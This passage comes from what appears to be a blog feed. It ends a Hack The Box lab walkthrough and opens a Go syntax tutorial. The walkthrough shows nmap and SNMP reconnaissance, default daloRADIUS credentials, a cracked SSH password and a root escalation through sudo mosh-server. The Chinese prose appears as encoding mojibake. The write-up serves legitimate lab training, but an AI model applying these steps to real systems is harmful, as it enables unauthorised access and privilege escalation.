class="hljs-title">W2</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W3</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W4</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W5</span>=<span class="hljs-title">FE88</span>%<span class="hljs-title">W6</span>=<span class="hljs-title">FE88</span>)<span class="hljs-title">E</span></span><br><span class="hljs-function"><span class="hljs-title">OS:CN</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=<span class="hljs-title">FAF0</span>%<span class="hljs-title">O</span>=<span class="hljs-title">M53ANNSNW7</span>%<span class="hljs-title">CC</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">Q</span>=)<span class="hljs-title">T1</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">S</span>=<span class="hljs-title">O</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:=<span class="hljs-title">AS</span>%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T2</span>(<span class="hljs-title">R</span>=<span class="hljs-title">N</span>)<span class="hljs-title">T3</span>(<span class="hljs-title">R</span>=<span class="hljs-title">N</span>)<span class="hljs-title">T4</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">A</span>%<span class="hljs-title">A</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">F</span>=<span class="hljs-title">R</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T5</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span>=<span class="hljs-title">AR</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T6</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">A</span>%<span class="hljs-title">A</span>=<span class="hljs-title">Z</span></span><br><span class="hljs-function"><span class="hljs-title">OS</span>:%<span class="hljs-title">F</span>=<span class="hljs-title">R</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">T7</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">W</span>=0%<span class="hljs-title">S</span>=<span class="hljs-title">Z</span>%<span class="hljs-title">A</span>=<span class="hljs-title">S</span>+%<span class="hljs-title">F</span>=<span class="hljs-title">AR</span>%<span class="hljs-title">O</span>=%<span class="hljs-title">RD</span>=0%<span class="hljs-title">Q</span>=)<span class="hljs-title">U1</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DF</span>=</span><br><span class="hljs-function"><span class="hljs-title">OS:N</span>%<span class="hljs-title">T</span>=40%<span class="hljs-title">IPL</span>=164%<span class="hljs-title">UN</span>=0%<span class="hljs-title">RIPL</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RID</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RIPCK</span>=<span class="hljs-title">G</span>%<span class="hljs-title">RUCK</span>=<span class="hljs-title">EAE7</span>%<span class="hljs-title">RUD</span>=<span class="hljs-title">G</span>)<span class="hljs-title">IE</span>(<span class="hljs-title">R</span>=<span class="hljs-title">Y</span>%<span class="hljs-title">DFI</span>=<span class="hljs-title">N</span>%<span class="hljs-title">T</span>=</span><br><span class="hljs-function"><span class="hljs-title">OS</span>:40%<span class="hljs-title">CD</span>=<span class="hljs-title">S</span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">Network</span> <span class="hljs-title">Distance</span>: 3 <span class="hljs-title">hops</span></span><br><span class="hljs-function"><span class="hljs-title">Service</span> <span class="hljs-title">Info</span>: <span class="hljs-title">OS</span>: <span class="hljs-title">Linux</span>; <span class="hljs-title">CPE</span>: <span class="hljs-title">cpe</span>:/<span class="hljs-title">o:linux</span>:<span class="hljs-title">linux_kernel</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">TRACEROUTE</span> (<span class="hljs-title">using</span> <span class="hljs-title">port</span> 3389/<span class="hljs-title">tcp</span>)</span><br><span class="hljs-function"><span class="hljs-title">HOP</span> <span class="hljs-title">RTT</span>       <span class="hljs-title">ADDRESS</span></span><br><span class="hljs-function">1   0.27 <span class="hljs-title">ms</span>   172.30.144.1</span><br><span class="hljs-function">2   369.92 <span class="hljs-title">ms</span> 10.10.16.1</span><br><span class="hljs-function">3   370.15 <span class="hljs-title">ms</span> 10.10.11.48</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">OS</span> <span class="hljs-title">and</span> <span class="hljs-title">Service</span> <span class="hljs-title">detection</span> <span class="hljs-title">performed</span>. <span class="hljs-title">Please</span> <span class="hljs-title">report</span> <span class="hljs-title">any</span> <span class="hljs-title">incorrect</span> <span class="hljs-title">results</span> <span class="hljs-title">at</span> <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">submit</span>/ .</span><br><span class="hljs-function"><span class="hljs-title">Nmap</span> <span class="hljs-title">done</span>: 1 <span class="hljs-title">IP</span> <span class="hljs-title">address</span> (1 <span class="hljs-title">host</span> <span class="hljs-title">up</span>) <span class="hljs-title">scanned</span> <span class="hljs-title">in</span> 52.86 <span class="hljs-title">seconds</span></span><br></code></pre></td></tr></table></figure><p>å¼€äº† http å’Œ ssh</p><h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>è®¿é—® http æœåŠ¡ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰</p><p><img src="https://img.dkdun.cn/v1/2025/12/9bf9e7ad7d96c4e2.png"></p><h3 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs cmd">â””â”€# nmap -sV -Pn -A -sU <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Starting Nmap <span class="hljs-number">7</span>.<span class="hljs-number">94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span> <span class="hljs-number">18</span>:<span class="hljs-number">46</span> CST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">11</span>.<span class="hljs-number">48</span><br>Host is up (<span class="hljs-number">0</span>.<span class="hljs-number">32</span>s latency).<br><span class="hljs-keyword">Not</span> shown: <span class="hljs-number">997</span> closed udp ports (port-unreach)<br>PORT     STATE         SERVICE VERSION<br><span class="hljs-number">161</span>/udp  open          snmp    SNMPv1 server; <span class="hljs-built_in">net</span>-snmp SNMPv3 server (public)<br>| snmp-info:<br>|   enterprise: <span class="hljs-built_in">net</span>-snmp<br>|   engineIDFormat: unknown<br>|   engineIDData: c7ad5c4856d1cf6600000000<br>|   snmpEngineBoots: <span class="hljs-number">31</span><br>|_  snmpEngineTime: <span class="hljs-number">17</span>h05m41s<br>| snmp-sysdescr: Linux underpass <span class="hljs-number">5</span>.<span class="hljs-number">15</span>.<span class="hljs-number">0</span>-<span class="hljs-number">126</span>-generic #<span class="hljs-number">136</span>-Ubuntu SMP Wed Nov <span class="hljs-number">6</span> <span class="hljs-number">10</span>:<span class="hljs-number">38</span>:<span class="hljs-number">22</span> UTC <span class="hljs-number">2024</span> x86_64<br>|_  System uptime: <span class="hljs-number">17</span>h05m41.<span class="hljs-number">35</span>s (<span class="hljs-number">6154135</span> timeticks)<br><span class="hljs-number">1812</span>/udp open|filtered radius<br><span class="hljs-number">1813</span>/udp open|filtered radacct<br><span class="hljs-function">Warning: <span class="hljs-title">OSScan</span> <span class="hljs-title">results</span> <span class="hljs-title">may</span> <span class="hljs-title">be</span> <span class="hljs-title">unreliable</span> <span class="hljs-title">because</span> <span class="hljs-title">we</span> <span class="hljs-title">could</span> <span class="hljs-title">not</span> <span class="hljs-title">find</span> <span class="hljs-title">at</span> <span class="hljs-title">least</span> 1 <span class="hljs-title">open</span> <span class="hljs-title">and</span> 1 <span class="hljs-title">closed</span> <span class="hljs-title">port</span></span><br><span class="hljs-function"><span class="hljs-title">Aggressive</span> <span class="hljs-title">OS</span> <span class="hljs-title">guesses</span>: <span class="hljs-title">Citrix</span> <span class="hljs-title">Access</span> <span class="hljs-title">Gateway</span> <span class="hljs-title">VPN</span> <span class="hljs-title">gateway</span> (95%), <span class="hljs-title">Linksys</span> <span class="hljs-title">WRT610Nv3</span> <span class="hljs-title">WAP</span> (95%), 3<span class="hljs-title">Com</span> <span class="hljs-title">OfficeConnect</span> 3<span class="hljs-title">CRWER100</span>-75 <span class="hljs-title">wireless</span> <span class="hljs-title">broadband</span> <span class="hljs-title">router</span> (94%), <span class="hljs-title">Adtran</span> 424<span class="hljs-title">RG</span> <span class="hljs-title">FTTH</span> <span class="hljs-title">gateway</span> (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 3.4 (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 5.1 (94%), <span class="hljs-title">Aerohive</span> <span class="hljs-title">HiveOS</span> 7.1 (94%), <span class="hljs-title">AirMagnet</span> <span class="hljs-title">SmartEdge</span> <span class="hljs-title">wireless</span> <span class="hljs-title">sensor</span>; <span class="hljs-title">or</span> <span class="hljs-title">Foscam</span> <span class="hljs-title">FI8904W</span>, <span class="hljs-title">FI8910W</span>, <span class="hljs-title">or</span> <span class="hljs-title">FI8918W</span>, <span class="hljs-title">or</span> <span class="hljs-title">Instar</span> <span class="hljs-title">IN</span>-3010 <span class="hljs-title">surveillance</span> <span class="hljs-title">camera</span> (<span class="hljs-title">Linux</span> 2.4) (94%), <span class="hljs-title">Alcatel</span>-<span class="hljs-title">Lucent</span> <span class="hljs-title">OmniPCX</span> <span class="hljs-title">GD3</span> <span class="hljs-title">PBX</span> (<span class="hljs-title">Linux</span> 2.6.23) (94%), <span class="hljs-title">Allnet</span> 2210 <span class="hljs-title">webcam</span>, <span class="hljs-title">Cisco</span> <span class="hljs-title">MDS</span> 9124 <span class="hljs-title">or</span> 9216<span class="hljs-title">i</span> <span class="hljs-title">switch</span> (<span class="hljs-title">SAN</span>-<span class="hljs-title">OS</span> 3.1 - 3.2), <span class="hljs-title">or</span> <span class="hljs-title">Nortel</span> <span class="hljs-title">IP</span> <span class="hljs-title">Phone</span> 1535 (94%)</span><br><span class="hljs-function"><span class="hljs-title">No</span> <span class="hljs-title">exact</span> <span class="hljs-title">OS</span> <span class="hljs-title">matches</span> <span class="hljs-title">for</span> <span class="hljs-title">host</span> (<span class="hljs-title">test</span> <span class="hljs-title">conditions</span> <span class="hljs-title">non</span>-<span class="hljs-title">ideal</span>).</span><br><span class="hljs-function"><span class="hljs-title">Network</span> <span class="hljs-title">Distance</span>: 3 <span class="hljs-title">hops</span></span><br><span class="hljs-function"><span class="hljs-title">Service</span> <span class="hljs-title">Info</span>: <span class="hljs-title">Host</span>: <span class="hljs-title">UnDerPass.htb</span> <span class="hljs-title">is</span> <span class="hljs-title">the</span> <span class="hljs-title">only</span> <span class="hljs-title">daloradius</span> <span class="hljs-title">server</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">basin</span>!</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">TRACEROUTE</span> (<span class="hljs-title">using</span> <span class="hljs-title">port</span> 38063/<span class="hljs-title">udp</span>)</span><br><span class="hljs-function"><span class="hljs-title">HOP</span> <span class="hljs-title">RTT</span>       <span class="hljs-title">ADDRESS</span></span><br><span class="hljs-function">1   0.22 <span class="hljs-title">ms</span>   172.30.144.1</span><br><span class="hljs-function">2   373.85 <span class="hljs-title">ms</span> 10.10.16.1</span><br><span class="hljs-function">3   319.73 <span class="hljs-title">ms</span> 10.10.11.48</span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">OS</span> <span class="hljs-title">and</span> <span class="hljs-title">Service</span> <span class="hljs-title">detection</span> <span class="hljs-title">performed</span>. <span class="hljs-title">Please</span> <span class="hljs-title">report</span> <span class="hljs-title">any</span> <span class="hljs-title">incorrect</span> <span class="hljs-title">results</span> <span class="hljs-title">at</span> <span class="hljs-title">https</span>://<span class="hljs-title">nmap.org</span>/<span class="hljs-title">submit</span>/ .</span><br><span class="hljs-function"><span class="hljs-title">Nmap</span> <span class="hljs-title">done</span>: 1 <span class="hljs-title">IP</span> <span class="hljs-title">address</span> (1 <span class="hljs-title">host</span> <span class="hljs-title">up</span>) <span class="hljs-title">scanned</span> <span class="hljs-title">in</span> 1225.45 <span class="hljs-title">seconds</span></span><br></code></pre></td></tr></table></figure><p>161 ç«¯å£æœ‰ <code>snmp</code> æœåŠ¡</p><p>SNMPï¼ˆç®€å•ç½‘ç»œç®¡ç†åè®®ï¼‰ï¼Œæ˜¯ä¸€ä¸ªåº”ç”¨å±‚åè®®ï¼Œä¸ºç½‘ç»œèŠ‚ç‚¹æä¾›äº†ä¸€ä¸ªé€šç”¨çš„ç®¡ç†æ–¹æ³•ã€‚æ›´å¤šè¯¦æƒ…ï¼š<a href="https://www.cnblogs.com/chegxy/p/14020233.html">https://www.cnblogs.com/chegxy/p/14020233.html</a></p><p>ç”¨ snmpwalk æ‰“å°å‡º IP è¯¦ç»†ä¿¡æ¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">snmpwalk</span> -v <span class="hljs-number">2</span>c -c public <span class="hljs-number">10.10.11.48</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8383c412e168bb97.png"></p><p>å¯ä»¥çœ‹åˆ°ä¸¤æ¡ä¿¡æ¯</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.4.0</span> = STRING: <span class="hljs-string">&quot;steve@underpass.htb&quot;</span><br><span class="hljs-attribute">iso</span>.<span class="hljs-number">3.6.1.2</span>.<span class="hljs-number">1.1.5.0</span> = STRING: <span class="hljs-string">&quot;UnDerPass.htb is the only daloradius server in the basin!&quot;</span><br></code></pre></td></tr></table></figure><p>ä¸€æ¡å¸¦æœ‰ htb ç»“å°¾çš„åŸŸåï¼Œå¦ä¸€æ¡ç»™å‡ºäº† <code>daloradius</code> æœåŠ¡å™¨ï¼Œ<code>daloradius</code> æ˜¯ä¸€ä¸ª RADIUS Web ç®¡ç†åº”ç”¨ç¨‹åºï¼Œç”¨äºç®¡ç†çƒ­ç‚¹å’Œé€šç”¨çš„ ISP éƒ¨ç½²ï¼Œ</p><p>æœä¸€ä¸‹æ‰¾åˆ°äº† <a href="https://github.com/lirantal/daloradius">daloRADIUS</a>ï¼Œå‘ç°æœ‰ <code>login.php</code> é¡µé¢ï¼Œè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://10.10.11.48/daloradius/app/users/login.php<br></code></pre></td></tr></table></figure><p>å¾—åˆ°äº†ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶ä¸”åœ¨ <a href="https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS">https://github.com/lirantal/daloradius/wiki/Installing-daloRADIUS</a> æ‰¾åˆ°äº†é»˜è®¤ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Username:</span> administrator<br><span class="hljs-symbol">Password:</span> radius<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯é»˜è®¤çš„ç™»ä¸è¿›å»ï¼Œæ‰¾åˆ°äº†å¦ä¸€ä¸ªè·¯å¾„ä¸‹çš„ <code>login.php</code> </p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.48</span><span class="hljs-regexp">//</span>daloradius<span class="hljs-regexp">/app/</span>operators/login.php<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8feb7134cf1276bb.png"></p><p>æ‰¾åˆ°äº†ä¸€ä¸ªç”¨æˆ·å’Œå¯†ç </p><p><img src="https://img.dkdun.cn/v1/2025/12/a27a171a6902fb13.png"></p><p>å¯†ç çˆ†ç ´å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/72c9eda786f794c5.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">underwaterfriends</span><br></code></pre></td></tr></table></figure><p>å°è¯• ssh ç™»å½•ï¼Œèƒ½è¿›å»</p><p><img src="https://img.dkdun.cn/v1/2025/12/5aa6f4d30ec762e8.png"></p><h2 id="Submit-root-flag"><a href="#Submit-root-flag" class="headerlink" title="Submit root flag"></a>Submit root flag</h2><p><code>sudo -l </code> å‘ç° <code>mosh-server</code> èƒ½ <code>sudo</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">svcMosh@underpass:~$ <span class="hljs-title">sudo</span> -<span class="hljs-title">l</span></span><br><span class="hljs-function"><span class="hljs-title">Matching</span> <span class="hljs-title">Defaults</span> <span class="hljs-title">entries</span> <span class="hljs-title">for</span> <span class="hljs-title">svcMosh</span> <span class="hljs-title">on</span> <span class="hljs-title">localhost</span>:</span><br><span class="hljs-function">    <span class="hljs-title">env_reset</span>, <span class="hljs-title">mail_badpass</span>, <span class="hljs-title">secure_path</span>=/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>\:/<span class="hljs-title">sbin</span>\:/<span class="hljs-title">bin</span>\:/<span class="hljs-title">snap</span>/<span class="hljs-title">bin</span>, <span class="hljs-title">use_pty</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-title">User</span> <span class="hljs-title">svcMosh</span> <span class="hljs-title">may</span> <span class="hljs-title">run</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span> <span class="hljs-title">commands</span> <span class="hljs-title">on</span> <span class="hljs-title">localhost</span>:</span><br><span class="hljs-function">    (<span class="hljs-title">ALL</span>) <span class="hljs-title">NOPASSWD</span>: /<span class="hljs-title">usr</span>/<span class="hljs-title">bin</span>/<span class="hljs-title">mosh</span>-<span class="hljs-title">server</span></span><br></code></pre></td></tr></table></figure><p>Mosh è¡¨ç¤º Mobile Shellï¼Œæ˜¯ä¸€ä¸ªä»å®¢æˆ·ç«¯è·¨äº’è”ç½‘è¿æ¥è¿œç¨‹æœåŠ¡å™¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼ŒMosh æœ€å¤§ç‰¹ç‚¹å°±æ˜¯ UDP ä¼ è¾“ï¼Œæ‰€ä»¥ä¼ è¾“å¿«ã€‚</p><p>åˆ©ç”¨ Mosh ææƒ</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">mosh --server<span class="hljs-operator">=</span><span class="hljs-string">&quot;sudo /usr/bin/mosh-server&quot;</span> localhost<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/d02a84fd82bca22c.png"></p><p>æ‹¿åˆ° flag</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Re:ä»é›¶å¼€å§‹çš„ Go ä¹‹æ—…- åŸºç¡€è¯­æ³•(3)</title>
    <link href="/2025/03/09/Go-3/"/>
    <url>/2025/03/09/Go-3/</url>
    
    <content type="html"><![CDATA[<p>ç»§ç»­ Go</p><span id="more"></span><h1 id="æ¡ä»¶è¯­å¥"><a href="#æ¡ä»¶è¯­å¥" class="headerlink" title="æ¡ä»¶è¯­å¥"></a>æ¡ä»¶è¯­å¥</h1><p>ifï¼Œifâ€¦elseï¼Œif åµŒå¥—ï¼Œswitchï¼Œselectï¼Œgoto</p><p>select ç±»ä¼¼äº switchï¼Œselect ä¼šéšæœºæ‰§è¡Œå¯è¿è¡Œçš„ caseï¼Œæ²¡æœ‰ case å¯è¿è¡Œçš„è¯ï¼Œä¼šé˜»å¡åˆ°æœ‰ case å¯è¿è¡Œ</p><h2 id="if"><a href="#if" class="headerlink" title="if"></a>if</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a, b := <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br><span class="hljs-keyword">if</span> a &lt; b &#123;<br>fmt.Println(<span class="hljs-string">&quot;hhh&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;xxx&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">switch</span> expr &#123;<br>  <span class="hljs-keyword">case</span> case1:<br>    statement1<br>  <span class="hljs-keyword">case</span> case2:<br>    statement2<br>  <span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">default</span> statement<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¾‹å­</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;a&quot;</span><br><span class="hljs-keyword">switch</span> str &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;a&quot;</span>:<br>str += <span class="hljs-string">&quot;a&quot;</span><br>str += <span class="hljs-string">&quot;c&quot;</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;b&quot;</span>:<br>str += <span class="hljs-string">&quot;bb&quot;</span><br>str += <span class="hljs-string">&quot;aa&quot;</span><br><span class="hljs-keyword">default</span>:<br>str += <span class="hljs-string">&quot;cc&quot;</span><br>&#125;<br>fmt.Println(str)<br>&#125;<br>&gt;&gt;aac<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥åœ¨è¡¨è¾¾å¼ä¹‹å‰å£°æ˜å˜é‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>num := <span class="hljs-number">2</span><br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> num &gt;= <span class="hljs-number">0</span> &amp;&amp; num &lt;= <span class="hljs-number">1</span>:<br>num++<br><span class="hljs-keyword">case</span> num &gt; <span class="hljs-number">1</span>:<br>num--<br><span class="hljs-keyword">fallthrough</span><br><span class="hljs-keyword">case</span> num &lt; <span class="hljs-number">0</span>:<br>num += num<br>&#125;<br>fmt.Println(num)<br>&#125;<br>&gt;&gt; <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><code>fallthrough</code> å…³é”®å­—ä¼šç»§ç»­æ‰§è¡Œç›¸é‚»çš„ä¸‹ä¸€ä¸ªåˆ†æ”¯ï¼Œä¸ç„¶ä¼šè‡ªåŠ¨è·³å‡ºï¼Œåœ¨ go ä¸­çš„ switch ç›¸å½“äºæ˜¯ c è¯­è¨€ä¸­æ¯ä¸ª <code>case</code> åé¢æ·»åŠ äº† <code>break</code> è¯­å¥ï¼Œæ‰€ä»¥ä¼šè‡ªåŠ¨ç»ˆæ­¢ã€‚&#96;&#96;fallthroug<code>å®ƒä¼šæ— æ¡ä»¶åœ°æ‰§è¡Œä¸‹ä¸€ä¸ª case è¯­å¥ï¼Œè€Œä¸ä¼šè¿›è¡Œæ¡ä»¶æ£€æŸ¥ï¼Œæ‰€ä»¥ä¾‹å­ä¸­çš„</code>num<code>ç»è¿‡äº†</code>-<code>ï¼Œåˆç»è¿‡äº† </code>ï¼‹&#96; ï¼Œ å¹¶æ²¡æœ‰å˜åŒ–ã€‚</p><h1 id="å¾ªç¯è¯­å¥"><a href="#å¾ªç¯è¯­å¥" class="headerlink" title="å¾ªç¯è¯­å¥"></a>å¾ªç¯è¯­å¥</h1><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><p>go ä¸­åªæœ‰ä¸€ä¸ª <code>for</code> å¾ªç¯ï¼Œä¸€èˆ¬æ ¼å¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> init statement; expression; post statement &#123;<br>  execute statement<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ <code>while</code> æ¥ä½¿ç”¨æ—¶</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> expression &#123;<br>  execute statement<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰“å°æ•°ç»„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> b <span class="hljs-type">int</span> = <span class="hljs-number">6</span><br><span class="hljs-comment">//var a int</span><br>numbers := [<span class="hljs-number">6</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span 